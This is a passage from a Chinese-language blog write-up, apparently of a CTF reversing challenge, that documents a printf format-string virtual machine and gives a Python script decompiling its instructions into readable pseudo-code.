flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> extra:<span class="hljs-number">1</span>;<span class="hljs-comment">/* For special use.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> is_char:<span class="hljs-number">1</span>;<span class="hljs-comment">/* hh flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> wide:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Nonzero for wide character streams.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i18n:<span class="hljs-number">1</span>;<span class="hljs-comment">/* I flag.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> is_binary128:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Floating-point argument is ABI-compatible</span><br><span class="hljs-comment">   with IEC 60559 binary128.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> __pad:<span class="hljs-number">3</span>;<span class="hljs-comment">/* Unused so far.  */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> user;<span class="hljs-comment">/* Bits for user-installed modifiers.  */</span><br>  <span class="hljs-keyword">wchar_t</span> pad;<span class="hljs-comment">/* Padding character.  */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>指令解析规则</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">*(info + <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x20</span> =&gt; -<br>*(info + <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x40</span> =&gt; +<br>*(info + <span class="hljs-number">13</span>) &amp; <span class="hljs-number">2</span>    =&gt; hh<br>*(info + <span class="hljs-number">12</span>) &amp; <span class="hljs-number">1</span>    =&gt; ll<br>*(info + <span class="hljs-number">12</span>) &amp; <span class="hljs-number">2</span>    =&gt; h<br>*(info + <span class="hljs-number">12</span>) &amp; <span class="hljs-number">4</span>    =&gt; l<br></code></pre></td></tr></table></figure><p>根据 vm 指令规则写了一个 decompiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addrResolver</span>(<span class="hljs-params">addr</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-built_in">str</span>(addr)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decompiler</span>(<span class="hljs-params">insn, addr</span>):</span><br>    regx = <span class="hljs-string">r&quot;%([-+]?)([0-9]*)(\.)?([0-9]*)([h|l|ll|hh|w]*)([IWPTFCMSOXVNLREU])&quot;</span><br>    rr = re.match(regx, insn, flags=re.X|re.M)<br>    <span class="hljs-keyword">if</span> rr <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        print(insn)<br>        <span class="hljs-keyword">return</span><br>    parser = rr.groups()<br>    <span class="hljs-comment"># print(insn, parser)</span><br>    op_name = parser[-<span class="hljs-number">1</span>]<br>    op1 = parser[<span class="hljs-number">1</span>]<br>    op2 = parser[<span class="hljs-number">3</span>]<br>    type2 = parser[-<span class="hljs-number">2</span>]<br>    type1 = parser[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;C&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: if (state[%s] &lt; 0) goto %s&quot;</span> % (addrResolver(addr), op2, addrResolver(op1)), rr.group(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: if (state[%s] &gt; 0) goto %s&quot;</span> % (addrResolver(addr), op2, addrResolver(op1)), rr.group(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">if</span> parser[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;0&quot;</span>:<br>            op1 = op1[<span class="hljs-number">1</span>:]<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: if (state[%s] == 0) goto %s&quot;</span> % (addrResolver(addr), op2, addrResolver(op1)), rr.group(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: goto %s&quot;</span> % (addrResolver(addr), addrResolver(op1)), rr.group(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;M&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br><br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>: <span class="hljs-comment">## ??</span><br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s = %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;S&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s += %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;O&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br><br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s -= %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;X&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s *= %s&quot;</span> % (addrResolver(addr), target, source),rr.group(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;V&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s /= %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;N&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s = %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;L&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br><br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s &lt;&lt;= %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;R&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br><br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s &gt;&gt;= %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;E&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br><br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s ^= %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;I&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br><br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s &amp;= %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> op_name == <span class="hljs-string">&quot;U&quot;</span>:<br>        <span class="hljs-keyword">if</span> type1 == <span class="hljs-string">&quot;-&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">elif</span> type1 == <span class="hljs-string">&quot;+&quot;</span>:<br>            target = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br>        <span class="hljs-keyword">else</span>:<br>            target = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op1)<br><br>        <span class="hljs-keyword">if</span> type2 == <span class="hljs-string">&quot;hh&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;h&quot;</span>:<br>            source = <span class="hljs-string">&quot;a52cS[state[%s]]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;ll&quot;</span>:<br>            source = <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">elif</span> type2 == <span class="hljs-string">&quot;l&quot;</span>:<br>            source = <span class="hljs-string">&quot;state[%s]&quot;</span> % <span class="hljs-built_in">str</span>(op2)<br>        <span class="hljs-keyword">else</span>:<br>            source = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s: %s |= %s&quot;</span> % (addrResolver(addr), target, source), rr.group(<span class="hljs-number">0</span>)<br><br><br></code></pre></td></tr></table></figure><p>入口第一段 vm 指令</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs haml">src = &#x27;&#x27;&#x27;%52C%s\x00<br><span class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.1hM</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.0lE</span></span><br><span class="hljs-tag">%</span>+1.3lM<br><span class="hljs-tag">%<span class="hljs-selector-tag">1</span><span class="hljs-selector-class">.4llS</span></span><br><span 